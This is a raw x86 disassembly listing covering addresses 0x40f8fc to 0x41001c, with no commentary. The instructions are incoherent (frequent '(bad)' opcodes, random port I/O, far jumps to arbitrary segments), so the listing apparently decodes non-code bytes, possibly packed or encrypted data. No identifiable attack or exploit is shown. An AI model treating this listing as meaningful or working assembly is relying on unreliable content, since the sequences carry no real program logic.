  40f8fc:	in     al,0x8e
  40f8fe:	push   0x3b0d655f
  40f903:	adc    eax,0x4160a18f
  40f908:	aam    0x96
  40f90a:	cmc    
  40f90b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f90c:	bound  eax,QWORD PTR [eax]
  40f90e:	lea    eax,[esi+eiz*8+0x25e92af5]
  40f915:	sbb    DWORD PTR [ecx],ebp
  40f917:	mov    esi,0xbf9bc4f5
  40f91c:	retf   0xe562
  40f91f:	mov    edx,0xf9792ee0
  40f924:	sbb    esp,edi
  40f926:	cmp    BYTE PTR gs:[ecx-0x20],0x9b
  40f92b:	push   ecx
  40f92c:	jbe    0x40f964
  40f92e:	pop    es
  40f92f:	mov    ecx,0x3efb7060
  40f934:	inc    esp
  40f935:	jge    0x40f968
  40f937:	ret    0xcab9
  40f93a:	mov    ds:0x6ed27a99,al
  40f93f:	jb     0x40f8d1
  40f941:	retf   
  40f942:	nop
  40f943:	jae    0x40f9a0
  40f945:	retf   
  40f946:	mov    eax,ds:0x6199bc2b
  40f94b:	je     0x40f9c3
  40f94d:	or     al,0x27
  40f94f:	or     edi,0x4f35f2bd
  40f955:	pop    ecx
  40f956:	je     0x40f95e
  40f958:	or     ah,ch
  40f95a:	pusha  
  40f95b:	je     0x40f928
  40f95d:	sub    ebx,edi
  40f95f:	push   ds
  40f960:	pop    es
  40f961:	mov    bl,al
  40f963:	xlat   BYTE PTR ds:[ebx]
  40f964:	xchg   esp,eax
  40f965:	cmc    
  40f966:	popa   
  40f967:	hlt    
  40f968:	popf   
  40f969:	js     0x40f931
  40f96b:	mov    dh,0xcc
  40f96d:	mov    ebx,0xc9405ef5
  40f972:	adc    eax,0xe86c0a
  40f977:	add    esi,DWORD PTR [edi+edx*8-0x7e]
  40f97b:	fbld   TBYTE PTR [eax+eiz*8-0x23]
  40f97f:	mov    bl,BYTE PTR [ebp+0x6d8635f4]
  40f985:	int3   
  40f986:	sahf   
  40f987:	mov    esp,0x169783f0
  40f98c:	jle    0x40f9d2
  40f98e:	pop    ecx
  40f98f:	jge    0x40f9ca
  40f991:	jle    0x40f98f
  40f993:	add    BYTE PTR [edx+0xb],ch
  40f996:	enter  0x1c52,0x34
  40f99a:	push   es
  40f99b:	repz jl 0x40f91f
  40f99e:	dec    ebx
  40f99f:	xchg   ebx,eax
  40f9a0:	push   edi
  40f9a1:	or     al,0xdf
  40f9a3:	jb     0x40fa11
  40f9a5:	xchg   ebx,eax
  40f9a6:	aas    
  40f9a7:	pop    ebp
  40f9a8:	(bad)  
  40f9a9:	mov    ds:0x4ffbfb2c,eax
  40f9ae:	iret   
  40f9af:	push   esi
  40f9b0:	push   ds
  40f9b1:	or     DWORD PTR ds:0x9ffb4925,edi
  40f9b7:	mov    DWORD PTR [ecx+0x55],ebx
  40f9ba:	add    ebx,ebp
  40f9bc:	aaa    
  40f9bd:	lock sub esp,DWORD PTR [esi+0x2f]
  40f9c1:	scas   eax,DWORD PTR es:[edi]
  40f9c2:	push   edx
  40f9c3:	push   ebx
  40f9c4:	mov    bh,bl
  40f9c6:	sbb    BYTE PTR [edi-0x82f85d8],cl
  40f9cc:	adc    esp,ebp
  40f9ce:	inc    eax
  40f9cf:	pop    esi
  40f9d0:	jle    0x40fa4e
  40f9d2:	repz or al,0x7f
  40f9d5:	dec    edx
  40f9d6:	mov    esi,0xc677b921
  40f9db:	mov    bh,0x9f
  40f9dd:	bound  ebp,QWORD PTR [edi]
  40f9df:	xchg   ebp,eax
  40f9e0:	jmp    0xe3d9:0xced94227
  40f9e7:	pop    esp
  40f9e8:	outs   dx,BYTE PTR ds:[esi]
  40f9e9:	ins    DWORD PTR es:[edi],dx
  40f9ea:	fnstcw WORD PTR [edx]
  40f9ec:	nop
  40f9ed:	shr    DWORD PTR ss:[edi],cl
  40f9f0:	sbb    al,0x3
  40f9f2:	adc    eax,0x36884846
  40f9f7:	add    DWORD PTR ds:0x3408af68,esp
  40f9fd:	dec    DWORD PTR [edi-0x4d790903]
  40fa03:	je     0x40fa34
  40fa05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa06:	ins    DWORD PTR es:[edi],dx
  40fa07:	adc    ebp,DWORD PTR [esi+0x39]
  40fa0a:	inc    edx
  40fa0b:	adc    al,BYTE PTR [ebx]
  40fa0d:	jle    0x40fa1a
  40fa0f:	pop    edi
  40fa10:	ds jnp 0x40f9d7
  40fa13:	pop    edx
  40fa14:	ret    
  40fa15:	push   cs
  40fa16:	(bad)  
  40fa17:	xor    edx,DWORD PTR [edx]
  40fa19:	jg     0x40fa58
  40fa1b:	push   ebx
  40fa1c:	mov    ebp,0x60858475
  40fa21:	xor    eax,0xe85a9b61
  40fa26:	xchg   edx,eax
  40fa27:	mov    esp,0xe8dd83d6
  40fa2c:	rcl    BYTE PTR [edi+0x39ead9e7],0xf6
  40fa33:	scas   eax,DWORD PTR es:[edi]
  40fa34:	cmc    
  40fa35:	sub    BYTE PTR [edi+eiz*1-0x2c],bl
  40fa39:	imul   ebp,ebp,0xffffffa6
  40fa3c:	jmp    0x40fa65
  40fa3e:	stos   DWORD PTR es:[edi],eax
  40fa3f:	mov    eax,edx
  40fa41:	leave  
  40fa42:	push   ss
  40fa43:	inc    edi
  40fa44:	sbb    eax,0x4cafbaa7
  40fa49:	nop
  40fa4a:	outs   dx,DWORD PTR ds:[esi]
  40fa4b:	sar    DWORD PTR [eax-0x58d1372],1
  40fa51:	out    0x40,eax
  40fa53:	cmp    ebx,ebp
  40fa55:	out    dx,al
  40fa56:	jp     0x40faa7
  40fa58:	and    bl,ah
  40fa5a:	pop    ebx
  40fa5b:	scas   eax,DWORD PTR es:[edi]
  40fa5c:	ret    
  40fa5d:	push   esi
  40fa5e:	xchg   esp,eax
  40fa5f:	and    al,0xd7
  40fa61:	pusha  
  40fa62:	popf   
  40fa63:	push   esp
  40fa64:	mov    dx,0x6f68
  40fa68:	outs   dx,BYTE PTR ds:[esi]
  40fa69:	pushf  
  40fa6a:	xor    al,0xb6
  40fa6c:	test   BYTE PTR [eax-0xd],dl
  40fa6f:	loopne 0x40f9f3
  40fa71:	daa    
  40fa72:	out    0x55,al
  40fa74:	pop    es
  40fa75:	xor    ebp,DWORD PTR [eax+0x51]
  40fa78:	xchg   esi,eax
  40fa79:	mov    ebp,0x29728365
  40fa7e:	pop    edi
  40fa7f:	mov    ch,0x21
  40fa81:	or     cl,cl
  40fa83:	outs   dx,DWORD PTR ds:[esi]
  40fa84:	jbe    0x40fa2b
  40fa86:	les    ecx,FWORD PTR [esi]
  40fa88:	adc    eax,0xbb26e133
  40fa8d:	inc    esp
  40fa8e:	and    BYTE PTR [edi-0xec38b5a],bh
  40fa94:	jno    0x40faba
  40fa96:	jl     0x40fac0
  40fa98:	push   eax
  40fa99:	dec    ebx
  40fa9a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa9c:	xor    BYTE PTR [ebp-0x72],bl
  40fa9f:	xchg   BYTE PTR [edx],dl
  40faa1:	(bad)  
  40faa2:	nop
  40faa3:	xchg   esp,ebp
  40faa5:	xchg   esi,eax
  40faa6:	(bad)  
  40faa8:	push   ebp
  40faa9:	jl     0x40fb09
  40faab:	jecxz  0x40fb2a
  40faad:	fdiv   QWORD PTR [eax]
  40faaf:	aam    0xc2
  40fab1:	rol    DWORD PTR [ebp+0x41150dad],1
  40fab7:	xchg   BYTE PTR [ebx-0x6130a967],ah
  40fabd:	mov    dl,0x91
  40fabf:	dec    edx
  40fac0:	inc    esi
  40fac1:	sbb    ecx,DWORD PTR [ebx]
  40fac3:	rcl    BYTE PTR [ebp-0x1d],0x6
  40fac7:	int    0x75
  40fac9:	mov    dh,0xd4
  40facb:	pop    ds
  40facc:	add    eax,0x19b60ac
  40fad1:	mov    cl,0x22
  40fad3:	cmp    BYTE PTR [edx-0xbc9e0e1],al
  40fad9:	pop    es
  40fada:	xchg   BYTE PTR [edi-0x7b],ah
  40fadd:	jae    0x40fb22
  40fadf:	shr    BYTE PTR [edx],1
  40fae1:	jnp    0x40fa7c
  40fae3:	add    DWORD PTR [edi+0x50552309],esp
  40fae9:	add    DWORD PTR [edx+0x5c48306],0xa9480b57
  40faf3:	cli    
  40faf4:	cmc    
  40faf5:	sub    esp,DWORD PTR [edi+0x7417b5b3]
  40fafb:	les    edx,FWORD PTR [esi+ebx*4+0x9c6f9a6]
  40fb02:	(bad)  
  40fb03:	jecxz  0x40fac2
  40fb05:	std    
  40fb06:	cmp    ebx,DWORD PTR [ecx+eax*2]
  40fb09:	jnp    0x40fb71
  40fb0b:	enter  0x4563,0xb3
  40fb0f:	adc    dh,BYTE PTR [eax+0x18772430]
  40fb15:	and    bl,BYTE PTR [ebp-0x12]
  40fb18:	add    al,0xab
  40fb1a:	xor    ebp,DWORD PTR [edi+0x103e3c51]
  40fb20:	jae    0x40faa6
  40fb22:	xor    DWORD PTR [esi+0x3842a337],ebx
  40fb28:	aas    
  40fb29:	daa    
  40fb2a:	xchg   esp,eax
  40fb2b:	pop    es
  40fb2c:	rcr    BYTE PTR [ebx+0x49d3d4b0],0x6e
  40fb33:	push   esp
  40fb34:	rcl    DWORD PTR [eax+0x20],cl
  40fb37:	and    eax,eax
  40fb39:	mov    esi,0xd242038a
  40fb3e:	(bad)  
  40fb3f:	sbb    DWORD PTR [ebp+0x10],ecx
  40fb42:	loope  0x40fb50
  40fb44:	jnp    0x40fb63
  40fb46:	push   0x9d24f9d8
  40fb4b:	cld    
  40fb4c:	push   ds
  40fb4d:	xchg   esi,eax
  40fb4e:	sbb    BYTE PTR [ebx+0x1075e531],al
  40fb54:	mov    ds:0xad4c46ca,eax
  40fb59:	inc    ebx
  40fb5a:	scas   al,BYTE PTR es:[edi]
  40fb5b:	clc    
  40fb5c:	push   ebp
  40fb5d:	xchg   ebx,eax
  40fb5e:	test   BYTE PTR [eax+0x43611661],dh
  40fb64:	rol    DWORD PTR [edx],0xd9
  40fb67:	out    dx,eax
  40fb68:	pop    esp
  40fb69:	or     eax,0xdc2ec4d4
  40fb6e:	sbb    DWORD PTR [edi-0x388374d7],edx
  40fb74:	div    DWORD PTR [ebx]
  40fb76:	loopne 0x40fb93
  40fb78:	mov    esp,0xff7e2314
  40fb7d:	imul   edx,DWORD PTR [edi],0xfa0f0f8
  40fb83:	call   0x7baaa4ef
  40fb88:	and    eax,0xa63b15fb
  40fb8d:	jb     0x40fb58
  40fb8f:	dec    ebx
  40fb90:	cmp    edi,DWORD PTR [edi+ebp*1+0x57770427]
  40fb97:	fwait
  40fb98:	sbb    DWORD PTR [esi],esi
  40fb9a:	sbb    esi,edx
  40fb9c:	mov    dl,0x0
  40fb9e:	and    ch,BYTE PTR [ebx]
  40fba0:	dec    esp
  40fba1:	mov    al,0xbb
  40fba3:	fstp   QWORD PTR [edx+0x6b]
  40fba6:	sub    eax,0xc3e7cdd0
  40fbab:	aas    
  40fbac:	nop
  40fbad:	inc    ebp
  40fbae:	js     0x40fc08
  40fbb0:	mov    cl,0x38
  40fbb2:	jbe    0x40fb3b
  40fbb4:	test   eax,0x4ba4a4e
  40fbb9:	mov    cl,BYTE PTR [ebp+ebx*4+0x1d]
  40fbbd:	mov    al,ds:0xff4b4cd4
  40fbc2:	xchg   ecx,eax
  40fbc3:	xor    bl,BYTE PTR ds:0x1b9df468
  40fbc9:	retf   0xf87d
  40fbcc:	push   ebp
  40fbcd:	sbb    al,0xa3
  40fbcf:	loopne 0x40fbd9
  40fbd1:	mov    al,ds:0x756c6de0
  40fbd6:	imul   ebx,DWORD PTR [eax+0x5e94e808],0xffffff81
  40fbdd:	add    BYTE PTR [eax-0x495d4979],ah
  40fbe3:	nop
  40fbe4:	test   al,0x94
  40fbe6:	aas    
  40fbe7:	out    dx,eax
  40fbe8:	cdq    
  40fbe9:	adc    esi,DWORD PTR [edi-0x111f7f6c]
  40fbef:	adc    esp,ebx
  40fbf1:	mov    cl,0xc0
  40fbf3:	stos   DWORD PTR es:[edi],eax
  40fbf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf5:	iret   
  40fbf6:	ss repnz loopne 0x40fc38
  40fbfa:	inc    ebx
  40fbfb:	out    dx,eax
  40fbfc:	ins    DWORD PTR es:[edi],dx
  40fbfd:	into   
  40fbfe:	lds    ecx,FWORD PTR [edx]
  40fc00:	xchg   ebp,eax
  40fc01:	outs   dx,DWORD PTR ds:[esi]
  40fc02:	popf   
  40fc03:	cmp    eax,0xc1e7e985
  40fc08:	jp     0xe32b5649
  40fc0e:	in     al,dx
  40fc0f:	push   esi
  40fc10:	inc    ebp
  40fc11:	xchg   BYTE PTR [ebx+0x2a],cl
  40fc14:	int3   
  40fc15:	sbb    BYTE PTR [esi+0x72e1045a],bl
  40fc1b:	sbb    bh,ch
  40fc1d:	(bad)  
  40fc1f:	loop   0x40fc99
  40fc21:	mov    edi,0xf7bce3eb
  40fc26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc27:	test   al,0x95
  40fc29:	jl     0x40fc39
  40fc2b:	cmp    cl,bh
  40fc2d:	les    esp,FWORD PTR [esi+eiz*2]
  40fc30:	aam    0x81
  40fc32:	cdq    
  40fc33:	int    0x46
  40fc35:	xor    BYTE PTR [ebx],dl
  40fc37:	in     eax,dx
  40fc38:	xor    DWORD PTR [eax-0x7d],ebx
  40fc3b:	xor    ebx,DWORD PTR [ecx]
  40fc3d:	jg     0x40fbe5
  40fc3f:	sbb    al,0xa
  40fc41:	xor    eax,0x4162256a
  40fc46:	pop    ss
  40fc47:	sbb    bl,BYTE PTR [eax-0x36baf13e]
  40fc4d:	pop    ebp
  40fc4e:	or     BYTE PTR [edi+0x71f3cbde],dh
  40fc54:	loope  0x40fc41
  40fc56:	jg     0x40fbdf
  40fc58:	push   es
  40fc59:	aad    0x74
  40fc5b:	std    
  40fc5c:	pop    eax
  40fc5d:	add    DWORD PTR [eax+ebx*4+0x6f673c6e],ebp
  40fc64:	push   ebp
  40fc65:	sbb    ebp,DWORD PTR [ecx+ebp*4]
  40fc68:	and    al,0x22
  40fc6a:	cmp    eax,0x234c44b0
  40fc6f:	scas   al,BYTE PTR es:[edi]
  40fc70:	std    
  40fc71:	shl    DWORD PTR [eax],cl
  40fc73:	pop    ecx
  40fc74:	adc    DWORD PTR [ebx-0x74082197],esi
  40fc7a:	stos   BYTE PTR es:[edi],al
  40fc7b:	test   BYTE PTR [edx],cl
  40fc7d:	mov    BYTE PTR [ebx],bh
  40fc7f:	out    0x5f,eax
  40fc81:	jmp    0x1ead1061
  40fc86:	(bad)  
  40fc87:	xor    cl,BYTE PTR [eax*8-0x7c7c20ec]
  40fc8e:	mov    esp,0x908b5847
  40fc93:	push   edi
  40fc94:	inc    edi
  40fc95:	lahf   
  40fc96:	stc    
  40fc97:	jg     0x40fced
  40fc99:	retf   
  40fc9a:	add    esp,DWORD PTR [ebx-0x1c]
  40fc9d:	inc    ecx
  40fc9e:	ss and cl,cl
  40fca1:	mov    al,0x15
  40fca3:	xchg   ebx,eax
  40fca4:	imul   edx,DWORD PTR [esi-0x1fb89221],0x6f995b3b
  40fcae:	jmp    0x8573:0x318d2bc2
  40fcb5:	adc    DWORD PTR [ebp+0x4480013],edi
  40fcbb:	inc    esi
  40fcbc:	sub    bh,bh
  40fcbe:	out    dx,eax
  40fcbf:	mov    ecx,0x5ef43990
  40fcc4:	xor    ebx,DWORD PTR [eax+0x161e0a8f]
  40fcca:	pop    edi
  40fccb:	mov    ds:0x29e44d7f,al
  40fcd0:	ret    0x8cba
  40fcd3:	jbe    0x40fcef
  40fcd5:	inc    ebx
  40fcd6:	mov    edx,0x27b4c619
  40fcdb:	mov    dh,0x58
  40fcdd:	(bad)  
  40fcde:	xor    ebx,DWORD PTR [esi+ebp*1-0x75e1d5b1]
  40fce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce6:	adc    al,0x75
  40fce8:	dec    esi
  40fce9:	and    eax,0x87e8c893
  40fcee:	hlt    
  40fcef:	ret    
  40fcf0:	jo     0x40fd6c
  40fcf2:	cmp    al,0x54
  40fcf4:	sbb    BYTE PTR ds:0x716a2851,ch
  40fcfa:	and    BYTE PTR [ebp+0x30fdc5c8],bh
  40fd00:	add    BYTE PTR [esi],al
  40fd02:	push   es
  40fd03:	lock xchg ebp,eax
  40fd05:	scas   al,BYTE PTR es:[edi]
  40fd06:	mov    eax,ds:0xaee07926
  40fd0b:	pop    edi
  40fd0c:	(bad)  
  40fd0d:	jmp    0xaf9ca128
  40fd12:	mov    al,0x17
  40fd14:	retf   
  40fd15:	daa    
  40fd16:	ins    BYTE PTR es:[edi],dx
  40fd17:	cmp    bh,BYTE PTR [ecx+0x41]
  40fd1a:	loop   0x40fcb0
  40fd1c:	outs   dx,DWORD PTR ds:[esi]
  40fd1d:	xchg   ecx,eax
  40fd1e:	jecxz  0x40fd17
  40fd20:	xchg   esp,eax
  40fd21:	mov    ds,WORD PTR [edx]
  40fd23:	jnp    0x40fd63
  40fd25:	push   ds
  40fd26:	mov    edx,0x328c7789
  40fd2b:	xor    DWORD PTR [ebp+0x323d8632],edx
  40fd31:	pop    ebp
  40fd32:	jg     0x40fcb6
  40fd34:	lods   al,BYTE PTR ds:[esi]
  40fd35:	std    
  40fd36:	retf   0xd2a0
  40fd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd3a:	sbb    al,al
  40fd3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd3d:	fisubr WORD PTR [edi+0x55]
  40fd40:	sbb    eax,0x4e71d098
  40fd45:	jne    0x40fd72
  40fd47:	loop   0x40fd31
  40fd49:	stos   DWORD PTR es:[edi],eax
  40fd4a:	mov    eax,ds:0x70a47b38
  40fd4f:	xchg   edi,eax
  40fd50:	pop    eax
  40fd51:	mov    al,0x97
  40fd53:	sbb    ecx,DWORD PTR [esi]
  40fd55:	aam    0x77
  40fd57:	ins    BYTE PTR es:[edi],dx
  40fd58:	in     al,dx
  40fd59:	mul    DWORD PTR [ecx+0x32]
  40fd5c:	int3   
  40fd5d:	ins    DWORD PTR es:[edi],dx
  40fd5e:	test   al,0x18
  40fd60:	(bad)  
  40fd61:	sub    bl,0x77
  40fd64:	fsub   st,st(0)
  40fd66:	xor    DWORD PTR [ebp-0x6f],edi
  40fd69:	retf   
  40fd6a:	cwde   
  40fd6b:	test   BYTE PTR [esi+0x194b0cea],cl
  40fd71:	mov    al,ds:0xdccd5f90
  40fd76:	mov    BYTE PTR [ebp+0xf],bh
  40fd79:	hlt    
  40fd7a:	cs push cs
  40fd7c:	mov    ecx,0xc5a8f4bf
  40fd81:	lods   eax,DWORD PTR ds:[esi]
  40fd82:	neg    BYTE PTR [edi+0x23f7cb7a]
  40fd88:	aaa    
  40fd89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd8a:	scas   eax,DWORD PTR es:[edi]
  40fd8b:	mov    DWORD PTR [ecx],edi
  40fd8d:	fwait
  40fd8e:	ja     0x40fd3c
  40fd90:	push   ebx
  40fd92:	repz xor eax,0x4e8f98d5
  40fd98:	adc    DWORD PTR gs:[edx],eax
  40fd9b:	pop    esi
  40fd9c:	dec    edi
  40fd9d:	cdq    
  40fd9e:	sahf   
  40fd9f:	jbe    0x40fda6
  40fda1:	popf   
  40fda2:	(bad)  
  40fda3:	ss icebp 
  40fda5:	cmp    al,0x7
  40fda7:	push   edi
  40fda8:	test   al,0x3d
  40fdaa:	sub    DWORD PTR [edi],edx
  40fdac:	in     al,0x8c
  40fdae:	fistp  DWORD PTR [esi-0x7e]
  40fdb1:	retf   
  40fdb2:	or     eax,ebx
  40fdb4:	mov    ebp,0x4c853314
  40fdb9:	xchg   ebp,eax
  40fdba:	test   eax,0xb2a85046
  40fdbf:	dec    esi
  40fdc0:	jl     0x40fdad
  40fdc2:	and    ebx,DWORD PTR [ebx-0x24]
  40fdc5:	xchg   BYTE PTR [ecx],bh
  40fdc7:	adc    al,0x96
  40fdc9:	lahf   
  40fdca:	int3   
  40fdcb:	xchg   esp,eax
  40fdcc:	cwde   
  40fdcd:	mov    ebx,0x6682f10e
  40fdd2:	push   esi
  40fdd3:	sub    al,0xaa
  40fdd5:	sub    bh,BYTE PTR [edi]
  40fdd7:	mov    ah,0x3d
  40fdd9:	sbb    al,0x61
  40fddb:	test   DWORD PTR [eax],edi
  40fddd:	inc    ebp
  40fdde:	jo     0x40fe1b
  40fde0:	js     0x40fd84
  40fde2:	cmp    BYTE PTR [ebx],ch
  40fde4:	adc    eax,0x49918445
  40fde9:	sbb    DWORD PTR [edi-0x1770fa0e],ebp
  40fdef:	add    eax,edi
  40fdf1:	lahf   
  40fdf2:	cmp    DWORD PTR [ecx+0x2b],ebx
  40fdf5:	add    eax,0xb3077777
  40fdfa:	jmp    0xd5e49b4b
  40fdff:	fcomi  st,st(3)
  40fe01:	int    0xdc
  40fe03:	clc    
  40fe04:	ins    DWORD PTR es:[edi],dx
  40fe05:	mov    esi,0x3372010c
  40fe0a:	lods   eax,DWORD PTR ds:[esi]
  40fe0b:	pop    esi
  40fe0c:	std    
  40fe0d:	ret    
  40fe0e:	enter  0x9457,0x23
  40fe12:	out    dx,eax
  40fe13:	push   eax
  40fe14:	mov    es,WORD PTR [esi-0x14]
  40fe17:	(bad)  
  40fe18:	hlt    
  40fe19:	aad    0x2a
  40fe1b:	jecxz  0x40fe86
  40fe1d:	hlt    
  40fe1e:	(bad)  
  40fe20:	popf   
  40fe21:	arpl   WORD PTR es:[edi-0x1516b1a7],ax
  40fe28:	inc    eax
  40fe29:	call   0x66ee:0x38c668d4
  40fe30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe31:	pop    ebp
  40fe32:	mov    bl,0xf2
  40fe34:	outs   dx,BYTE PTR ds:[esi]
  40fe35:	and    DWORD PTR [ecx+ebp*4-0x7f5e762],eax
  40fe3c:	and    DWORD PTR [edi+edx*8+0x61aeb494],esi
  40fe43:	mov    ds:0x19414788,eax
  40fe48:	sub    eax,0xd105516
  40fe4d:	loopne 0x40fe4d
  40fe4f:	xchg   esi,eax
  40fe50:	ins    DWORD PTR es:[edi],dx
  40fe51:	faddp  st(2),st
  40fe53:	sub    BYTE PTR [edi+0x3ce0a79],dl
  40fe59:	sbb    al,0x88
  40fe5b:	xor    al,0x7c
  40fe5d:	adc    DWORD PTR [eax-0x1e],0xffffffaa
  40fe61:	inc    edx
  40fe62:	cmp    al,0xd
  40fe64:	and    ebp,edx
  40fe66:	xor    eax,0xa5c55111
  40fe6b:	scas   al,BYTE PTR es:[edi]
  40fe6c:	mov    ebx,0xa40bfc6e
  40fe71:	push   ecx
  40fe72:	in     eax,0x83
  40fe74:	mov    ecx,0xbc33e2da
  40fe79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe7a:	xchg   ebp,eax
  40fe7b:	cmp    BYTE PTR [edx+0x6b],ah
  40fe7e:	stos   DWORD PTR es:[edi],eax
  40fe7f:	test   DWORD PTR [edi+0x3c0cdf0d],ecx
  40fe85:	(bad)  
  40fe86:	mov    bl,0xbe
  40fe88:	pushf  
  40fe89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe8a:	and    al,0xcc
  40fe8c:	div    bl
  40fe8e:	push   edx
  40fe8f:	mov    ecx,0xdc8f3aa9
  40fe94:	mov    cl,0xc4
  40fe96:	clc    
  40fe97:	jl     0x40feae
  40fe99:	jmp    DWORD PTR [ebx]
  40fe9b:	ret    
  40fe9c:	xor    al,0x33
  40fe9e:	xor    ebx,eax
  40fea0:	shr    eax,cl
  40fea2:	inc    ebx
  40fea3:	jmp    0x40fe8e
  40fea5:	xchg   edx,eax
  40fea6:	sbb    eax,0xaf2864e8
  40feab:	mov    ebp,0x49a1c299
  40feb0:	(bad)  
  40feb1:	out    0x3b,eax
  40feb3:	sbb    dh,BYTE PTR [edx+0x5fcbda82]
  40feb9:	int    0xe0
  40febb:	hlt    
  40febc:	mov    dh,0x45
  40febe:	mov    ecx,0x7e99df20
  40fec3:	xchg   esi,eax
  40fec4:	jbe    0x40fe9b
  40fec6:	pop    edi
  40fec7:	inc    ecx
  40fec8:	(bad)
  40fecb:	imul   edi,DWORD PTR [ebp+0x26],0xffffffdb
  40fecf:	scas   al,BYTE PTR es:[edi]
  40fed0:	cmp    al,0xac
  40fed2:	test   DWORD PTR [esi-0x23],eax
  40fed5:	mov    esi,0xca82f1dc
  40feda:	iret   
  40fedb:	jmp    0xec8e9a09
  40fee0:	pop    esp
  40fee1:	sub    esp,DWORD PTR [ecx-0x35]
  40fee4:	inc    edi
  40fee5:	jmp    0x40fe68
  40fee7:	test   eax,0x1e67c6db
  40feec:	fmul   QWORD PTR [ebp+0x7a]
  40feef:	(bad)  ds:0xb2df3427
  40fef5:	ds ret 
  40fef7:	jo     0x40fe8e
  40fef9:	pop    ss
  40fefa:	push   ebp
  40fefb:	cmp    ebx,DWORD PTR [edi]
  40fefd:	jle    0x40ff3e
  40feff:	xor    BYTE PTR [esi-0x5f],cl
  40ff02:	xchg   esi,eax
  40ff03:	dec    esp
  40ff04:	loop   0x40fe8b
  40ff06:	lods   eax,DWORD PTR ds:[esi]
  40ff07:	xchg   ebp,eax
  40ff08:	test   DWORD PTR [ecx-0x8c76d1d],0x79571afc
  40ff12:	mov    eax,ds:0xc7d757f
  40ff17:	lock loop 0x40ff6a
  40ff1a:	jo     0x40ff2a
  40ff1c:	inc    esp
  40ff1d:	pop    esp
  40ff1e:	js     0x40ff29
  40ff20:	cmp    al,0x93
  40ff22:	xchg   edx,eax
  40ff23:	mov    ebx,0x89017a3f
  40ff28:	repnz in eax,dx
  40ff2a:	dec    eax
  40ff2b:	out    dx,al
  40ff2c:	pop    es
  40ff2d:	xchg   esi,eax
  40ff2e:	(bad)  
  40ff30:	jno    0x40fee2
  40ff32:	xchg   esi,eax
  40ff33:	adc    eax,0x85a30744
  40ff38:	pop    ebp
  40ff39:	in     al,0xe1
  40ff3b:	js     0x40ff0e
  40ff3d:	lahf   
  40ff3e:	into   
  40ff3f:	aaa    
  40ff40:	mov    al,ds:0xd6d86c19
  40ff45:	or     BYTE PTR [esi+ebx*8],cl
  40ff48:	and    ch,BYTE PTR [esi+0x2464df2d]
  40ff4e:	or     al,0xe
  40ff50:	cwde   
  40ff51:	(bad)  
  40ff52:	jle    0x40ffb8
  40ff54:	dec    ebx
  40ff55:	leave  
  40ff56:	sub    eax,0x92fafe2f
  40ff5b:	mov    DWORD PTR ss:[ecx-0x237d6065],edx
  40ff62:	call   0xdac5:0x47fa60ae
  40ff69:	sub    al,0xb9
  40ff6b:	icebp  
  40ff6c:	xchg   esp,eax
  40ff6d:	inc    eax
  40ff6e:	inc    esp
  40ff6f:	mov    ?,WORD PTR [ebx+0x152e71ad]
  40ff75:	push   esi
  40ff76:	aam    0x67
  40ff78:	mov    edi,ebx
  40ff7a:	push   esi
  40ff7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff7c:	pop    esi
  40ff7d:	and    BYTE PTR [edi+0x8011a95],0x43
  40ff84:	dec    esi
  40ff85:	sub    bh,BYTE PTR [ebp+edx*1-0x79f5aef1]
  40ff8c:	mov    eax,ds:0x7793ffba
  40ff91:	mov    DWORD PTR [edx-0x547928a3],ebp
  40ff97:	add    al,0x6d
  40ff99:	jne    0x40ff78
  40ff9b:	add    DWORD PTR [ebx-0x258bbd47],esi
  40ffa1:	pop    es
  40ffa2:	lods   al,BYTE PTR ds:[esi]
  40ffa3:	xchg   esi,eax
  40ffa4:	sti    
  40ffa5:	in     al,dx
  40ffa6:	jbe    0x40ff81
  40ffa8:	fdiv   QWORD PTR [eax-0x56331504]
  40ffae:	lock xchg edx,eax
  40ffb0:	jg     0x40ffff
  40ffb2:	jns    0x40ffca
  40ffb4:	cs scas eax,DWORD PTR es:[edi]
  40ffb6:	xor    al,BYTE PTR [edx+ebx*2+0x12]
  40ffba:	adc    eax,0x9b5193f5
  40ffbf:	repnz (bad) 
  40ffc1:	out    dx,eax
  40ffc2:	or     DWORD PTR [esi+eiz*4-0x7f],esp
  40ffc6:	pop    edx
  40ffc7:	retf   0xda5e
  40ffca:	xchg   ebx,eax
  40ffcb:	daa    
  40ffcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffcd:	lahf   
  40ffce:	loopne 0x40ffc4
  40ffd0:	int    0x8a
  40ffd2:	lahf   
  40ffd3:	dec    edi
  40ffd5:	mov    dl,0x3d
  40ffd7:	cmp    BYTE PTR [esi+0x61942709],bl
  40ffdd:	xchg   BYTE PTR [eax],al
  40ffdf:	and    eax,0xa20c6b9a
  40ffe4:	pop    edx
  40ffe5:	mov    BYTE PTR ds:0x6d1adadf,ch
  40ffeb:	test   BYTE PTR [esi+0xe],cl
  40ffee:	jnp    0x40ffac
  40fff0:	inc    ebp
  40fff1:	leave  
  40fff2:	mov    bh,BYTE PTR [edx-0x23]
  40fff5:	repz sbb BYTE PTR [edx-0x42],al
  40fff9:	(bad)  
  40fffa:	pusha  
  40fffb:	shl    DWORD PTR [edi+0x62efe0fe],cl
  410001:	push   cs
  410002:	fisttp DWORD PTR [esi]
  410004:	not    DWORD PTR [ebp+0x7d]
  410007:	(bad)  
  410008:	aaa    
  410009:	popf   
  41000a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41000b:	xor    ch,BYTE PTR [ecx]
  41000d:	mov    eax,ds:0x46ebfddd
  410012:	arpl   WORD PTR [esi-0x48],dx
  410015:	sub    edx,DWORD PTR [esi]
  410017:	(bad)  
  410018:	jecxz  0x410056
  41001a:	sbb    bh,bl
  41001c:	test   ebx,edi
